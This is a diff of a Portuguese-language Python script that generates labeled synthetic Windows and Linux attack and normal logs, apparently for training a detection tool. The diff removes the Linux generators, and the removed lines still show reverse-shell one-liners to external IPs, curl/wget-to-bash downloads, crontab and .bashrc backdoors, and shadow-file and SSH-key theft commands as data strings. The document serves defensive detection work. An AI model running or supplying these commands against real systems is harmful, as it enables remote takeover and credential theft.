@@ -1,6 +1,5 @@
-# log_generator.py
-# SentinelAI - Gerador de Logs Sintéticos
-# Gera logs Windows e Linux (normais e de ataque) e organiza automaticamente nas pastas certas.
+# SentinelAI - Gerador de logs sinteticos Windows
+# Gera logs Windows e organiza os ficheiros por categoria.
 
 import os
 import random
@@ -13,18 +12,7 @@ from datetime import datetime, timedelta
 
 OUTPUT_BASE = "logs"
 
-STRUCTURE = {
-    "normal":  ["windows", "linux"],
-    "attack":  {
-        "persistence":       ["windows", "linux"],
-        "execution":         ["windows", "linux"],
-        "lateral_movement":  ["windows", "linux"],
-        "credential_access": ["windows", "linux"],
-    }
-}
-
 HOSTS_WINDOWS = ["DESKTOP-ABC123", "WORKSTATION-01", "SRV-FINANCE", "PC-JOHN", "LAPTOP-HR"]
-HOSTS_LINUX   = ["ubuntu-server", "kali-dev", "prod-web01", "db-server", "fileserver"]
 USERS         = ["john.doe", "admin", "alice", "bob", "svc_backup", "guest"]
 IPS_INTERNAL  = ["192.168.1.10", "192.168.1.20", "192.168.1.50", "10.0.0.5"]
 IPS_EXTERNAL  = ["185.220.101.1", "45.33.32.156", "198.51.100.1", "203.0.113.42"]
@@ -40,26 +28,21 @@ def random_time(days_back: int = 30) -> str:
                                       seconds=random.randint(0, 59))
     return base.strftime("%Y-%m-%dT%H:%M:%S.000Z")
 
-def syslog_time() -> str:
-    base = datetime.now() - timedelta(days=random.randint(0, 30),
-                                      hours=random.randint(0, 23))
-    return base.strftime("%b %d %H:%M:%S")
-
 def random_pid() -> int:
     return random.randint(1000, 65535)
 
-def random_host(platform: str) -> str:
-    return random.choice(HOSTS_WINDOWS if platform == "windows" else HOSTS_LINUX)
+def random_host() -> str:
+    return random.choice(HOSTS_WINDOWS)
 
 def random_user() -> str:
     return random.choice(USERS)
 
-def save_logs(logs: list, category: str, subcategory: str, platform: str, filename: str):
-    """Guarda logs no ficheiro correto e cria as pastas se não existirem."""
+def save_logs(logs: list, category: str, subcategory: str | None, filename: str):
+    """Guarda logs no ficheiro correto e cria as pastas em falta."""
     if subcategory:
-        folder = os.path.join(OUTPUT_BASE, category, subcategory, platform)
+        folder = os.path.join(OUTPUT_BASE, category, subcategory, "windows")
     else:
-        folder = os.path.join(OUTPUT_BASE, category, platform)
+        folder = os.path.join(OUTPUT_BASE, category, "windows")
 
     os.makedirs(folder, exist_ok=True)
     filepath = os.path.join(folder, filename)
@@ -68,11 +51,11 @@ def save_logs(logs: list, category: str, subcategory: str, platform: str, filena
         for log in logs:
             f.write(json.dumps(log, ensure_ascii=False) + "\n")
 
-    print(f"  ✅ {len(logs):>3} logs → {filepath}")
+    print(f"  OK  {len(logs):>3} logs -> {filepath}")
     return filepath
 
 # ============================================================
-# LOGS NORMAIS — WINDOWS
+# LOGS NORMAIS - WINDOWS
 # ============================================================
 
 def gen_normal_windows(n: int = 80) -> list:
@@ -98,7 +81,7 @@ def gen_normal_windows(n: int = 80) -> list:
     ]
     logs = []
     for _ in range(n):
-        host = random_host("windows")
+        host = random_host()
         user = random_user()
         cmd  = random.choice(normal_commands)
         logs.append({
@@ -115,50 +98,7 @@ def gen_normal_windows(n: int = 80) -> list:
     return logs
 
 # ============================================================
-# LOGS NORMAIS — LINUX
-# ============================================================
-
-def gen_normal_linux(n: int = 80) -> list:
-    normal_cmds = [
-        "ls -la /home",
-        "cd /var/log",
-        "cat /etc/hostname",
-        "ps aux",
-        "top -bn1",
-        "df -h",
-        "free -m",
-        "whoami",
-        "uname -a",
-        "ping -c 4 8.8.8.8",
-        "curl https://example.com",
-        "apt-get update",
-        "systemctl status nginx",
-        "journalctl -n 50",
-        "grep error /var/log/syslog",
-        "python3 app.py",
-        "git pull origin main",
-        "nano /etc/hosts",
-        "ssh user@192.168.1.10",
-    ]
-    logs = []
-    for _ in range(n):
-        host = random_host("linux")
-        user = random_user()
-        cmd  = random.choice(normal_cmds)
-        logs.append({
-            "source": "linux", "format": "json_synthetic",
-            "EventID": "EXECVE", "EventType": "Auditd EXECVE",
-            "TimeCreated": random_time(),
-            "Computer": host,
-            "User": user,
-            "CommandLine": cmd,
-            "ProcessId": str(random_pid()),
-            "label": "normal"
-        })
-    return logs
-
-# ============================================================
-# ATTACK — PERSISTENCE — WINDOWS
+# ATTACK - PERSISTENCE - WINDOWS
 # ============================================================
 
 def gen_attack_persistence_windows(n: int = 40) -> list:
@@ -183,7 +123,7 @@ def gen_attack_persistence_windows(n: int = 40) -> list:
     ]
     logs = []
     for _ in range(n):
-        host = random_host("windows")
+        host = random_host()
         template = random.choice(templates)
         entry = {
             "source": "windows", "format": "json_synthetic",
@@ -200,35 +140,7 @@ def gen_attack_persistence_windows(n: int = 40) -> list:
     return logs
 
 # ============================================================
-# ATTACK — PERSISTENCE — LINUX
-# ============================================================
-
-def gen_attack_persistence_linux(n: int = 40) -> list:
-    templates = [
-        f"(crontab -l; echo '@reboot /tmp/.hidden/backdoor') | crontab -",
-        f"echo '/tmp/payload' >> /etc/rc.local",
-        f"cp /tmp/payload /etc/init.d/sshd_helper && chmod +x /etc/init.d/sshd_helper",
-        f"systemctl enable /tmp/malicious.service",
-        f"echo 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' >> /home/{random.choice(USERS)}/.bashrc",
-    ]
-    logs = []
-    for _ in range(n):
-        logs.append({
-            "source": "linux", "format": "json_synthetic",
-            "EventID": "EXECVE", "EventType": "Auditd EXECVE",
-            "TimeCreated": random_time(),
-            "Computer": random_host("linux"),
-            "User": random_user(),
-            "CommandLine": random.choice(templates),
-            "ProcessId": str(random_pid()),
-            "label": "attack",
-            "mitre_tactic": "Persistence",
-            "mitre_technique": "T1053 - Scheduled Task/Job",
-        })
-    return logs
-
-# ============================================================
-# ATTACK — EXECUTION — WINDOWS
+# ATTACK - EXECUTION - WINDOWS
 # ============================================================
 
 def gen_attack_execution_windows(n: int = 40) -> list:
@@ -251,7 +163,7 @@ def gen_attack_execution_windows(n: int = 40) -> list:
             "source": "windows", "format": "json_synthetic",
             "EventID": "1", "EventType": "Process Creation (Sysmon)",
             "TimeCreated": random_time(),
-            "Computer": random_host("windows"),
+            "Computer": random_host(),
             "User": random_user(),
             "Image": cmd.split()[0],
             "CommandLine": cmd,
@@ -263,37 +175,7 @@ def gen_attack_execution_windows(n: int = 40) -> list:
     return logs
 
 # ============================================================
-# ATTACK — EXECUTION — LINUX
-# ============================================================
-
-def gen_attack_execution_linux(n: int = 40) -> list:
-    templates = [
-        f"bash -i >& /dev/tcp/{random.choice(IPS_EXTERNAL)}/4444 0>&1",
-        f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{random.choice(IPS_EXTERNAL)}\",4444))'",
-        f"curl http://{random.choice(IPS_EXTERNAL)}/shell.sh | bash",
-        f"wget -O- http://{random.choice(IPS_EXTERNAL)}/payload | sh",
-        f"chmod +x /tmp/.hidden && /tmp/.hidden",
-        f"nc -e /bin/bash {random.choice(IPS_EXTERNAL)} 4444",
-        f"perl -e 'use Socket;$i=\"{random.choice(IPS_EXTERNAL)}\";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"))'",
-    ]
-    logs = []
-    for _ in range(n):
-        logs.append({
-            "source": "linux", "format": "json_synthetic",
-            "EventID": "EXECVE", "EventType": "Auditd EXECVE",
-            "TimeCreated": random_time(),
-            "Computer": random_host("linux"),
-            "User": random_user(),
-            "CommandLine": random.choice(templates),
-            "ProcessId": str(random_pid()),
-            "label": "attack",
-            "mitre_tactic": "Execution",
-            "mitre_technique": "T1059 - Command and Scripting Interpreter",
-        })
-    return logs
-
-# ============================================================
-# ATTACK — LATERAL MOVEMENT — WINDOWS
+# ATTACK - LATERAL MOVEMENT - WINDOWS
 # ============================================================
 
 def gen_attack_lateral_windows(n: int = 30) -> list:
@@ -311,7 +193,7 @@ def gen_attack_lateral_windows(n: int = 30) -> list:
             "source": "windows", "format": "json_synthetic",
             "EventID": "1", "EventType": "Process Creation (Sysmon)",
             "TimeCreated": random_time(),
-            "Computer": random_host("windows"),
+            "Computer": random_host(),
             "User": random_user(),
             "CommandLine": cmd,
             "ProcessId": str(random_pid()),
@@ -322,34 +204,7 @@ def gen_attack_lateral_windows(n: int = 30) -> list:
     return logs
 
 # ============================================================
-# ATTACK — LATERAL MOVEMENT — LINUX
-# ============================================================
-
-def gen_attack_lateral_linux(n: int = 30) -> list:
-    templates = [
-        f"ssh -o StrictHostKeyChecking=no root@{random.choice(IPS_INTERNAL)}",
-        f"scp /tmp/payload root@{random.choice(IPS_INTERNAL)}:/tmp/",
-        f"rsync -avz /tmp/payload {random_user()}@{random.choice(IPS_INTERNAL)}:/tmp/",
-        f"ssh root@{random.choice(IPS_INTERNAL)} 'bash -i >& /dev/tcp/{random.choice(IPS_EXTERNAL)}/4444 0>&1'",
-    ]
-    logs = []
-    for _ in range(n):
-        logs.append({
-            "source": "linux", "format": "json_synthetic",
-            "EventID": "EXECVE", "EventType": "Auditd EXECVE",
-            "TimeCreated": random_time(),
-            "Computer": random_host("linux"),
-            "User": random_user(),
-            "CommandLine": random.choice(templates),
-            "ProcessId": str(random_pid()),
-            "label": "attack",
-            "mitre_tactic": "Lateral Movement",
-            "mitre_technique": "T1021.004 - SSH",
-        })
-    return logs
-
-# ============================================================
-# ATTACK — CREDENTIAL ACCESS — WINDOWS
+# ATTACK - CREDENTIAL ACCESS - WINDOWS
 # ============================================================
 
 def gen_attack_credential_windows(n: int = 30) -> list:
@@ -370,7 +225,7 @@ def gen_attack_credential_windows(n: int = 30) -> list:
             "source": "windows", "format": "json_synthetic",
             "EventID": "1", "EventType": "Process Creation (Sysmon)",
             "TimeCreated": random_time(),
-            "Computer": random_host("windows"),
+            "Computer": random_host(),
             "User": random_user(),
             "Image": cmd.split()[0],
             "CommandLine": cmd,
@@ -382,80 +237,44 @@ def gen_attack_credential_windows(n: int = 30) -> list:
     return logs
 
 # ============================================================
-# ATTACK — CREDENTIAL ACCESS — LINUX
-# ============================================================
-
-def gen_attack_credential_linux(n: int = 30) -> list:
-    templates = [
-        "cat /etc/shadow",
-        "unshadow /etc/passwd /etc/shadow > /tmp/hashes.txt",
-        f"john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/hashes.txt",
-        "cat /root/.ssh/id_rsa",
-        "find / -name '*.pem' 2>/dev/null",
-        f"hashcat -m 1800 /tmp/hashes.txt /usr/share/wordlists/rockyou.txt",
-        "grep -r 'password' /var/www/html/ 2>/dev/null",
-        "cat /home/*/.bash_history",
-    ]
-    logs = []
-    for _ in range(n):
-        logs.append({
-            "source": "linux", "format": "json_synthetic",
-            "EventID": "EXECVE", "EventType": "Auditd EXECVE",
-            "TimeCreated": random_time(),
-            "Computer": random_host("linux"),
-            "User": random_user(),
-            "CommandLine": random.choice(templates),
-            "ProcessId": str(random_pid()),
-            "label": "attack",
-            "mitre_tactic": "Credential Access",
-            "mitre_technique": "T1003 - OS Credential Dumping",
-        })
-    return logs
-
-# ============================================================
-# MAIN — Gerar e organizar tudo
+# MAIN - Gerar e organizar tudo
 # ============================================================
 
 def main():
     print("=" * 55)
-    print("  🛡️  SentinelAI — Gerador de Logs Sintéticos")
+    print("  SentinelAI - Gerador de Logs Sinteticos Windows")
     print("=" * 55)
     print()
 
     generators = [
         # (função,                          category,  subcategory,        platform,    filename)
-        (gen_normal_windows,               "normal",  None,               "windows",   "normal_windows.jsonl"),
-        (gen_normal_linux,                 "normal",  None,               "linux",     "normal_linux.jsonl"),
-        (gen_attack_persistence_windows,   "attack",  "persistence",      "windows",   "persistence_windows.jsonl"),
-        (gen_attack_persistence_linux,     "attack",  "persistence",      "linux",     "persistence_linux.jsonl"),
-        (gen_attack_execution_windows,     "attack",  "execution",        "windows",   "execution_windows.jsonl"),
-        (gen_attack_execution_linux,       "attack",  "execution",        "linux",     "execution_linux.jsonl"),
-        (gen_attack_lateral_windows,       "attack",  "lateral_movement", "windows",   "lateral_movement_windows.jsonl"),
-        (gen_attack_lateral_linux,         "attack",  "lateral_movement", "linux",     "lateral_movement_linux.jsonl"),
-        (gen_attack_credential_windows,    "attack",  "credential_access","windows",   "credential_access_windows.jsonl"),
-        (gen_attack_credential_linux,      "attack",  "credential_access","linux",     "credential_access_linux.jsonl"),
+        (gen_normal_windows, "normal", None, "normal_windows.jsonl"),
+        (gen_attack_persistence_windows, "attack", "persistence", "persistence_windows.jsonl"),
+        (gen_attack_execution_windows, "attack", "execution", "execution_windows.jsonl"),
+        (gen_attack_lateral_windows, "attack", "lateral_movement", "lateral_movement_windows.jsonl"),
+        (gen_attack_credential_windows, "attack", "credential_access", "credential_access_windows.jsonl"),
     ]
 
     total = 0
-    for gen_fn, category, subcategory, platform, filename in generators:
+    for gen_fn, category, subcategory, filename in generators:
         logs = gen_fn()
-        save_logs(logs, category, subcategory, platform, filename)
+        save_logs(logs, category, subcategory, filename)
         total += len(logs)
 
     print()
-    print(f"  📊 Total de logs gerados: {total}")
+    print(f"  Total de logs gerados: {total}")
     print()
-    print("  📁 Estrutura criada:")
+    print("  Estrutura criada:")
     for root, dirs, files in os.walk(OUTPUT_BASE):
         level = root.replace(OUTPUT_BASE, "").count(os.sep)
         indent = "  " + "  " * level
-        print(f"{indent}📂 {os.path.basename(root)}/")
+        print(f"{indent}[DIR] {os.path.basename(root)}/")
         for f in files:
             subindent = "  " + "  " * (level + 1)
-            print(f"{subindent}📄 {f}")
+            print(f"{subindent}[FILE] {f}")
 
     print()
-    print("  ✅ Pronto! Podes agora correr o sentinel.py")
+    print("  Geracao concluida. O motor de analise pode ser executado em seguida.")
     print("=" * 55)
 
 if __name__ == "__main__":
